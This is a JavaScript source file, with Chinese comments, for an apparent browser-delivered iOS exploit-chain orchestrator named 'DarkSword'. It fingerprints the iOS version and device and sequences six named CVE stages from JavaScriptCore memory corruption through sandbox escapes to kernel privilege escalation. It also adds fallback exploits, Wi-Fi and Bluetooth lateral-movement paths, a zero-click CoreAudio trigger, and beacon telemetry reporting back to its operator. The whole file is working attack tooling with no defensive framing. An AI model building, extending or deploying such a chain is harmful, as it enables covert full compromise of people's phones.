/**
 * DarkSword 攻击链编排器
 * 
 * 完整复现 CVE-2025-31277 → CVE-2025-43529 → CVE-2026-20700 → 
 * CVE-2025-14174 → CVE-2025-43510 → CVE-2025-43520 攻击链
 */

const AttackChainOrchestrator = {
  stages: {
    INITIAL_ENTRY: 'CVE-2025-31277',      // JavaScriptCore memory corruption
    RCE: 'CVE-2025-43529',                // WebKit UAF → RCE
    SANDBOX_ESCAPE: 'CVE-2026-20700',     // dyld code execution
    PRIV_ESC_1: 'CVE-2025-14174',         // ANGLE WebGL → GPU process
    PRIV_ESC_2: 'CVE-2025-43510',         // kernel sandbox escape
    FINAL_PRIV: 'CVE-2025-43520'          // kernel privilege escalation
  },
  
  currentStage: null,
  stageResults: {},
  
  // 动态选择器和执行器引用
  selector: null,
  executor: null,
  enhancedMode: false,
  
  /**
   * 初始化攻击链
   */
  init: function() {
    print("[Attack Chain] Initializing DarkSword exploit chain...");
    this.currentStage = this.stages.INITIAL_ENTRY;
    const env = this.detectEnvironment();
    
    // 检查是否启用增强模式（动态选择器 + Fallback）
    if (typeof window !== 'undefined' && window.exploitSelector && window.fallbackExecutor) {
      this.selector = window.exploitSelector;
      this.executor = window.fallbackExecutor;
      this.enhancedMode = true;
      
      // 设置上下文
      this.selector.setContext({
        iosVersion: env.version_str,
        build: env.build || 'unknown',
        device: env.device || 'unknown',
        capabilities: {
          wifi: this.detectWiFi(),
          bt: this.detectBluetooth()
        }
      });
      
      print("[Attack Chain] Enhanced mode enabled (dynamic selector + fallback)");
      this.selector.sendMetric('orchestrator_init', {
        enhancedMode: true,
        iosVersion: env.version_str
      });
    } else {
      print("[Attack Chain] Standard mode (static exploit chain)");
    }
  },
  
  /**
   * 环境检测
   */
  detectEnvironment: function() {
    const ios_version = (function() {
      let version = /iPhone OS ([0-9_]+)/g.exec(navigator.userAgent)?.[1];
      if (!version) {
        version = /CPU OS ([0-9_]+)/g.exec(navigator.userAgent)?.[1];
      }
      if (version) {
        return version.split('_').map(part => parseInt(part));
      }
    })();
    
    const version_str = ios_version ? ios_version.join('.') : 'unknown';
    print(`[Attack Chain] iOS Version: ${version_str}`);
    
    // 检测设备型号
    const isIPhone = /iPhone/.test(navigator.userAgent);
    const isIPad = /iPad/.test(navigator.userAgent) || (/Macintosh/.test(navigator.userAgent) && navigator.maxTouchPoints > 1);
    const device = isIPhone ? 'iPhone' : isIPad ? 'iPad' : 'Unknown';
    print(`[Attack Chain] Device: ${device}`);
    
    // 检测 Safari
    const isSafari = /Safari/.test(navigator.userAgent) && !/Chrome/.test(navigator.userAgent);
    print(`[Attack Chain] Browser: ${isSafari ? 'Safari' : 'Other'}`);
    
    // 检测构建号（如果可用）
    const build = this.detectBuildNumber();
    if (build) {
      print(`[Attack Chain] Build: ${build}`);
    }
    
    return {
      ios_version,
      version_str,
      isIPhone,
      isIPad,
      isSafari,
      device,
      build
    };
  },
  
  /**
   * 检测构建号
   */
  detectBuildNumber: function() {
    // 尝试从全局变量获取
    if (typeof IOS_BUILD_ID !== 'undefined') {
      return IOS_BUILD_ID;
    }
    return null;
  },
  
  /**
   * 检测 WiFi 可用性
   */
  detectWiFi: function() {
    if (typeof navigator !== 'undefined' && navigator.connection) {
      const type = navigator.connection.effectiveType || navigator.connection.type;
      return type === 'wifi' || type === '4g' || type === '5g';
    }
    return true; // 假设可用
  },
  
  /**
   * 检测蓝牙可用性
   */
  detectBluetooth: function() {
    if (typeof navigator !== 'undefined' && navigator.bluetooth) {
      return true;
    }
    return false; // 保守假设不可用
  },
  
  /**
   * 执行完整攻击链（支持动态选择和 Fallback）
   */
  executeChain: async function() {
    print("[Attack Chain] Starting full exploit chain execution...");
    this.stageResults = {};

    const runStage = async (stageId, label, fn) => {
      print(`[Attack Chain] ${label}`);
      
      // 如果启用增强模式，使用动态选择器
      if (this.enhancedMode && this.executor && stageId in this.stages) {
        const result = await this.executeStageWithFallback(stageId, fn);
        this.stageResults[stageId] = result;
        if (!result || result.success !== true) {
          const reason = result && result.error ? result.error : 'unknown failure';
          throw new Error(`${stageId} failed: ${reason}`);
        }
        return result;
      } else {
        // 标准模式
        const result = await fn.call(this);
        this.stageResults[stageId] = result;
        if (!result || result.success !== true) {
          const reason = result && (result.error || result.method) ? (result.error || result.method) : 'unknown failure';
          throw new Error(`${stageId} failed: ${reason}`);
        }
        return result;
      }
    };
    
    try {
      await runStage(
        this.stages.INITIAL_ENTRY,
        `Stage 1: ${this.stages.INITIAL_ENTRY} - JavaScriptCore Memory Corruption`,
        this.stageInitialEntry
      );
      await runStage(
        this.stages.RCE,
        `Stage 2: ${this.stages.RCE} - WebKit UAF → RCE`,
        this.stageRCE
      );
      await runStage(
        this.stages.SANDBOX_ESCAPE,
        `Stage 3: ${this.stages.SANDBOX_ESCAPE} - dyld Code Execution`,
        this.stageSandboxEscape
      );
      await runStage(
        this.stages.PRIV_ESC_1,
        `Stage 4: ${this.stages.PRIV_ESC_1} - ANGLE WebGL Exploit`,
        this.stageANGLEExploit
      );
      await runStage(
        this.stages.PRIV_ESC_2,
        `Stage 5: ${this.stages.PRIV_ESC_2} - Kernel Sandbox Escape`,
        this.stageKernelSandboxEscape
      );
      await runStage(
        this.stages.FINAL_PRIV,
        `Stage 6: ${this.stages.FINAL_PRIV} - Kernel Privilege Escalation`,
        this.stageFinalPrivEsc
      );
      
      print("[Attack Chain] ✓ Full chain execution completed");
      this.reportResults();
      
      if (typeof sendBeacon === 'function') {
        sendBeacon({ stage: 'pe', execStatus: 'success', extra: { chain: 'complete' } });
      }
      return { success: true, stageResults: this.stageResults };
      
    } catch(e) {
      print(`[Attack Chain] ✗ Chain execution failed at stage ${this.currentStage}: ${e.message}`);
      this.reportResults();
      if (typeof sendBeacon === 'function') {
        sendBeacon({ stage: this.currentStage || 'rce', execStatus: 'failed', extra: { err: e.message, stageResults: this.stageResults } });
      }
      return { success: false, error: e.message, failedStage: this.currentStage, stageResults: this.stageResults };
    }
  },
  
  /**
   * 使用 Fallback 执行单个阶段
   */
  executeStageWithFallback: async function(stageId, primaryFn) {
    // 查找该阶段的 Fallback 链配置
    const fallbackChain = window.FALLBACK_CHAINS && window.FALLBACK_CHAINS[stageId];
    
    if (!fallbackChain || fallbackChain.length === 0) {
      // 无 Fallback 配置，直接执行主方法
      print(`[Attack Chain] Stage ${stageId}: No fallback chain, using primary method only`);
      return await primaryFn.call(this);
    }
    
    // 构建方法数组
    const methods = [];
    
    for (const config of fallbackChain) {
      const exploit = this.selector.candidates.find(c => c.id === config.exploitId);
      if (!exploit) {
        print(`[Attack Chain] Warning: Exploit ${config.exploitId} not registered`);
        continue;
      }
      
      // 检查约束
      if (!this.selector.matchesConstraints(exploit, this.selector.context)) {
        print(`[Attack Chain] Skipping ${config.exploitId}: constraints not met`);
        continue;
      }
      
      // 创建执行函数
      const fn = this.createExploitFunction(exploit, stageId);
      if (fn) {
        methods.push({
          fn,
          id: exploit.id,
          priority: config.priority,
          timeout: config.timeout
        });
      }
    }
    
    if (methods.length === 0) {
      print(`[Attack Chain] Stage ${stageId}: No eligible fallback methods, using primary`);
      return await primaryFn.call(this);
    }
    
    // 使用 Fallback 执行器
    print(`[Attack Chain] Stage ${stageId}: Using fallback chain with ${methods.length} methods`);
    return await this.executor.executeFallbackChain(stageId, methods);
  },
  
  /**
   * 为 exploit 创建执行函数
   */
  createExploitFunction: function(exploit, stageId) {
    // 内置映射
    const functionMap = {
      'CVE-2026-20700': () => this.stageSandboxEscape(),
      'CVE-2025-24201': () => this.stageWebKitSandboxEscape(),
      'ANGLE-IOSurface-Combo': () => this.stageANGLEIOSurfaceCombo(),
      'CVE-2025-43520': () => this.stageFinalPrivEsc(),
      'BCMWLAN-AMPDU': () => this.stageBCMWLANPrivEsc()
    };
    
    const fn = functionMap[exploit.id];
    if (fn) {
      return fn.bind(this);
    }
    
    // 插件系统：通过 pluginLoader 查找入口函数
    if (window.pluginLoader) {
      const pluginFn = window.pluginLoader.getEntryFunction(exploit.id);
      if (pluginFn) {
        return pluginFn;
      }
    }
    
    // 最终 fallback：在全局作用域按 entryFunction 名查找
    if (exploit.entryFunction && typeof window[exploit.entryFunction] === 'function') {
      return window[exploit.entryFunction];
    }
    
    print(`[Attack Chain] Warning: No implementation for ${exploit.id}`);
    return null;
  },
  
  /**
   * ANGLE + IOSurface 组合攻击（慢速 Fallback）
   */
  stageANGLEIOSurfaceCombo: async function() {
    print("[Combo Attack] Attempting ANGLE WebGL + IOSurface combo...");
    
    // 先执行 ANGLE 部分
    const angleResult = await this.stageANGLEExploit();
    if (!angleResult || !angleResult.success) {
      return { success: false, error: 'ANGLE phase failed' };
    }
    
    // 再建立 IOSurface 通道
    const iosurfaceResult = await this.stageKernelSandboxEscape();
    if (!iosurfaceResult || !iosurfaceResult.success) {
      return { success: false, error: 'IOSurface phase failed' };
    }
    
    print("[Combo Attack] ✓ ANGLE + IOSurface combo succeeded");
    return { success: true, method: 'ANGLE-IOSurface-Combo' };
  },
  
  /**
   * Stage 1: JavaScriptCore 初始入口
   */
  stageInitialEntry: async function() {
    this.currentStage = this.stages.INITIAL_ENTRY;
    
    // 触发 JSC memory corruption (由 rce_module.js 实现)
    if (typeof check_attempt !== 'undefined') {
      print("[Stage 1] Triggering JavaScriptCore memory corruption...");
      try {
        const attempt = new check_attempt();
        const result = await attempt.start();
        if (result) {
          print("[Stage 1] ✓ Memory corruption successful");
          return { success: true, method: 'rce_module.js check_attempt' };
        } else {
          print("[Stage 1] ✗ Memory corruption failed, retrying...");
          const result2 = await attempt.start();
          if (result2) {
            print("[Stage 1] ✓ Memory corruption successful on retry");
            return { success: true, method: 'rce_module.js check_attempt (retry)' };
          }
          return { success: false, error: 'check_attempt failed after retry' };
        }
      } catch(e) {
        return { success: false, error: 'check_attempt exception: ' + e.message };
      }
    }
    
    return { success: false, error: 'check_attempt not available' };
  },
  
  /**
   * Stage 2: WebKit RCE
   *
   * rce_worker_18.4/18.6.js 在完成 stage1 → setup_fcall 序列后，
   * 会在 rce_module.js 的全局作用域内暴露 `fcall` 函数和 `p` 对象
   * (p.read64 / p.write64 / p.addrof / p.fakeobj)。
   * 此处轮询这两个全局量，确认 WebContent 进程内 RCE primitive 已就绪。
   */
  stageRCE: async function() {
    this.currentStage = this.stages.RCE;
    print("[Stage 2] Waiting for WebContent RCE primitive (fcall + p.read64)...");

    const TIMEOUT_MS = 30000;
    const POLL_MS    = 500;
    let elapsed = 0;

    while (elapsed < TIMEOUT_MS) {
      if (globalThis.ios26_fcall_ready === true) {
        print("[Stage 2] ✓ iOS 26 worker reported fcall_ready");
        return { success: true, method: 'rce_worker_26 fcall_ready' };
      }
      if (globalThis.ios26_primitive_status && globalThis.ios26_primitive_status.success === false) {
        return { success: false, error: 'iOS 26 primitive self-test failed: ' + (globalThis.ios26_primitive_status.reason || 'unknown') };
      }
      if (globalThis.ios26_worker_status && globalThis.ios26_worker_status.success === false) {
        return { success: false, error: 'iOS 26 worker failed: ' + (globalThis.ios26_worker_status.reason || 'unknown') };
      }
      // fcall 由 rce_worker setup_fcall case 通过 JOP thread 建立
      if (typeof fcall !== 'undefined' &&
          typeof p    !== 'undefined' && typeof p.read64 === 'function') {
        print("[Stage 2] ✓ WebContent fcall + p.read64 ready");
        return { success: true, method: 'rce_worker stage1+fcall' };
      }
      // 降级：p 有效但 fcall 尚未就绪（stage1 刚完成，JOP thread 还在初始化）
      if (typeof p !== 'undefined' && typeof p.read64 === 'function') {
        print("[Stage 2] ✓ p.read64 ready (fcall pending)");
        return { success: true, method: 'rce_module p.read64' };
      }
      await new Promise(r => setTimeout(r, POLL_MS));
      elapsed += POLL_MS;
    }

    // Fallback: try CVE-2025-43529 standalone UAF module
    if (typeof CVE_2025_43529_Exploit !== 'undefined' && !CVE_2025_43529_Exploit.initialized) {
      print("[Stage 2] Primary RCE timeout, trying CVE-2025-43529 UAF fallback...");
      try {
        const uafResult = CVE_2025_43529_Exploit.init();
        if (uafResult) {
          print("[Stage 2] ✓ CVE-2025-43529 UAF primitives ready");
          return { success: true, method: 'webkit_uaf_CVE-2025-43529.js fallback' };
        }
      } catch(e) {
        print("[Stage 2] CVE-2025-43529 UAF fallback failed: " + e.message);
      }
    }

    return { success: false, error: 'RCE primitive not available after 30s' };
  },

  /**
   * Stage 3: dyld 沙箱逃逸 (CVE-2026-20700)
   *
   * sbx0_main_18.4.js 完成后，会在 WebContent 全局作用域内设置：
   *   gpuRead64 / gpuWrite64 / gpu_fcall / gpuDlsym / gpuPacia / gpuPacib
   * 这些函数代表 WebContent → GPU process 的 R/W 通道已通过 IPC 建立。
   * 轮询 gpuRead64 存在，确认 sbx0 dyld exploit 已落地。
   */
  stageSandboxEscape: async function() {
    this.currentStage = this.stages.SANDBOX_ESCAPE;
    print("[Stage 3] Waiting for GPU process R/W (sbx0 dyld escape)...");

    const TIMEOUT_MS = 60000;
    const POLL_MS    = 1000;
    let elapsed = 0;

    while (elapsed < TIMEOUT_MS) {
      // sbx0_main_18.4.js 的最后阶段设置这两个全局函数
      if (typeof gpuRead64  !== 'undefined' &&
          typeof gpuWrite64 !== 'undefined') {
        print("[Stage 3] ✓ GPU process R/W primitives ready (gpuRead64/gpuWrite64)");
        return { success: true, method: 'sbx0_main_18.4.js dyld escape' };
      }
      await new Promise(r => setTimeout(r, POLL_MS));
      elapsed += POLL_MS;
    }

    return { success: false, error: 'GPU R/W primitives not available after 60s' };
  },
  
  /**
   * Stage 4: ANGLE WebGL 利用
   */
  stageANGLEExploit: async function() {
    this.currentStage = this.stages.PRIV_ESC_1;
    
    if (typeof triggerANGLEExploit === 'function') {
      print("[Stage 4] Triggering ANGLE WebGL exploit...");
      try {
        await triggerANGLEExploit();
        return { success: true, method: 'angle_webgl_CVE-2025-14174.js' };
      } catch(e) {
        return { success: false, error: e.message };
      }
    }
    
    return { success: false, error: 'ANGLE module not loaded' };
  },
  
  /**
   * Stage 5: Kernel 沙箱逃逸 (CVE-2025-43510)
   *
   * sbx1_main.js 完成后在全局暴露以下标志：
   *   globalThis.sbx1_done      = true
   *   globalThis.kernelRead64   = function  (通过 IOSurface 建立的 kernel R/W)
   *   globalThis.kernelWrite64  = function
   *
   * 轮询这些标志，确认 GPU → kernel 通道已打通。
   */
  stageKernelSandboxEscape: async function() {
    this.currentStage = this.stages.PRIV_ESC_2;
    print("[Stage 5] Waiting for kernel R/W (sbx1 IOSurface escape)...");

    const TIMEOUT_MS = 90000;
    const POLL_MS    = 1000;
    let elapsed = 0;

    while (elapsed < TIMEOUT_MS) {
      if (globalThis.sbx1_done === true) {
        const hasKrw = typeof globalThis.kernelRead64  === 'function' &&
                       typeof globalThis.kernelWrite64 === 'function';
        print(`[Stage 5] ✓ sbx1 complete; kernel R/W = ${hasKrw}`);
        return { success: true, method: 'sbx1_main.js IOSurface kernel R/W' };
      }
      // sbx1 进度标志（sbx1_main.js 的 LOG 函数通过 globalThis.sbx1_begin 计时）
      if (typeof globalThis.sbx1_begin !== 'undefined' && elapsed === 0) {
        print("[Stage 5] sbx1_main.js is running...");
      }
      await new Promise(r => setTimeout(r, POLL_MS));
      elapsed += POLL_MS;
    }

    return { success: false, error: 'sbx1 kernel R/W not available after 90s' };
  },
  
  /**
   * Stage 6: 最终提权
   */
  stageFinalPrivEsc: async function() {
    this.currentStage = this.stages.FINAL_PRIV;
    
    // iOS 26: kernel_priv_26.js IIFE 自动执行提权，检查 pe_done 标志
    if (globalThis.pe_done === true) {
      print("[Stage 6] ✓ Privilege escalation already completed (pe_done=true)");
      return { success: true, method: 'kernel_priv_26.js (auto-executed)' };
    }
    
    // iOS 26 入口函数
    if (typeof triggerKernelPrivEsc_26 === 'function') {
      print("[Stage 6] Triggering iOS 26 kernel privilege escalation...");
      try {
        const result = await triggerKernelPrivEsc_26();
        if (result && result.success) {
          return { success: true, method: 'kernel_priv_26.js' };
        }
        return { success: false, error: result ? result.error : 'unknown failure' };
      } catch(e) {
        return { success: false, error: e.message };
      }
    }
    
    // iOS 17-18 入口函数
    if (typeof triggerKernelPrivEsc === 'function') {
      print("[Stage 6] Triggering kernel privilege escalation...");
      try {
        await triggerKernelPrivEsc();
        return { success: true, method: 'kernel_priv_CVE-2025-43520.js' };
      } catch(e) {
        return { success: false, error: e.message };
      }
    }
    
    return { success: false, error: 'Kernel priv esc module not loaded' };
  },

  // ===================== 扩展攻击路径 =====================

  /**
   * 备选路径 A: WebKit OOB Write 沙箱逃逸 (CVE-2025-24201)
   * 适用于 iOS < 18.3.2，作为 sbx0 dyld escape 的替代方案
   */
  stageWebKitSandboxEscape: async function() {
    print("[Alt Path A] CVE-2025-24201 WebKit sandbox escape...");
    
    if (typeof initWebKitSandboxEscape === 'function') {
      try {
        const result = await initWebKitSandboxEscape();
        return { success: result, method: 'webkit_sbx_CVE-2025-24201.js' };
      } catch(e) {
        return { success: false, error: e.message };
      }
    }
    
    return { success: false, error: 'WebKit SBX module not loaded' };
  },

  /**
   * 备选路径 B: AppleBCMWLAN AMPDU 内核提权
   * 适用于有 WiFi 且在同一信道的场景，可替代 CVE-2025-43520
   */
  stageBCMWLANPrivEsc: async function() {
    print("[Alt Path B] AppleBCMWLAN AMPDU subframe length confusion...");
    
    if (typeof initBCMWLANPrivEsc === 'function') {
      try {
        const result = await initBCMWLANPrivEsc();
        return { success: result, method: 'bcmwlan_priv_escalation.js' };
      } catch(e) {
        return { success: false, error: e.message };
      }
    }
    
    return { success: false, error: 'BCMWLAN module not loaded' };
  },

  /**
   * 后利用: BCM4387 Bluetooth 横向移动
   * 需要 kernel r/w 已建立，利用 BT 共享 SRAM 做横向
   */
  stageBCM4387BTPivot: async function() {
    print("[Post-Exploit] BCM4387 Bluetooth SRAM write + HCI injection...");
    
    if (typeof initBCM4387BTPivot === 'function') {
      try {
        const result = await initBCM4387BTPivot();
        return { success: result, method: 'bcm4387_bt_pivot.js' };
      } catch(e) {
        return { success: false, error: e.message };
      }
    }
    
    return { success: false, error: 'BCM4387 BT module not loaded' };
  },

  /**
   * 执行扩展攻击链（包含备选路径 + 后利用）
   */
  executeExtendedChain: async function() {
    print("[Attack Chain] Starting extended chain (alternate paths + post-exploit)...");
    
    const primary = await this.executeChain();

    if (primary.success) {
      this.reportResults();
      return primary;
    }

    if (this.stageResults[this.stages.SANDBOX_ESCAPE] &&
        !this.stageResults[this.stages.SANDBOX_ESCAPE].success) {
      print("[Attack Chain] Primary sandbox escape failed, trying WebKit OOB write...");
      this.stageResults['CVE-2025-24201'] = await this.stageWebKitSandboxEscape();
    }

    if (this.stageResults[this.stages.FINAL_PRIV] &&
        !this.stageResults[this.stages.FINAL_PRIV].success) {
      print("[Attack Chain] Primary kernel priv esc failed, trying BCMWLAN...");
      this.stageResults['BCMWLAN'] = await this.stageBCMWLANPrivEsc();
    }

    const kernelSuccess = this.stageResults[this.stages.FINAL_PRIV]?.success ||
                          this.stageResults['BCMWLAN']?.success;
    if (kernelSuccess) {
      print("[Attack Chain] Kernel access confirmed, attempting BT lateral movement...");
      this.stageResults['BCM4387_BT'] = await this.stageBCM4387BTPivot();
    }

    this.reportResults();
    return { success: !!kernelSuccess, stageResults: this.stageResults, primary };
  },
  
  /**
   * 报告执行结果
   */
  reportResults: function() {
    print("\n[Attack Chain] === Execution Summary ===");
    for (const [stage, result] of Object.entries(this.stageResults)) {
      const status = result.success ? '✓' : '✗';
      const method = result.method || result.error || 'unknown';
      print(`[Attack Chain] ${status} ${stage}: ${method}`);
    }
    print("[Attack Chain] ========================\n");
  },
  
  /**
   * 零点击触发器（用于 CoreAudio 攻击向量）
   */
  triggerZeroClick: async function() {
    print("[Attack Chain] Attempting zero-click vector via CoreAudio...");
    
    if (typeof triggerCoreAudioExploit === 'function') {
      try {
        await triggerCoreAudioExploit();
        print("[Attack Chain] ✓ Zero-click vector triggered");
        return true;
      } catch(e) {
        print(`[Attack Chain] ✗ Zero-click failed: ${e.message}`);
        return false;
      }
    }
    
    print("[Attack Chain] CoreAudio module not available");
    return false;
  }
};

// 初始化后仅按显式 URL 参数触发执行，避免模块加载即误报全链成功。
if (typeof window !== 'undefined') {
  window.AttackChainOrchestrator = AttackChainOrchestrator;
  AttackChainOrchestrator.init();

  const chainMode = new URLSearchParams(window.location.search).get('chain');
  if (chainMode === 'main') {
    AttackChainOrchestrator.executeChain();
  } else if (chainMode === 'extended') {
    AttackChainOrchestrator.executeExtendedChain();
  } else {
    print("[Attack Chain Orchestrator] Ready; pass ?chain=main or ?chain=extended to execute");
    if (typeof sendBeacon === 'function') {
      sendBeacon({ stage: 'rce', execStatus: 'running', extra: { orchestrator: 'ready', chainMode: 'manual' } });
    }
  }
}

print("[Attack Chain Orchestrator] Module loaded and initialized");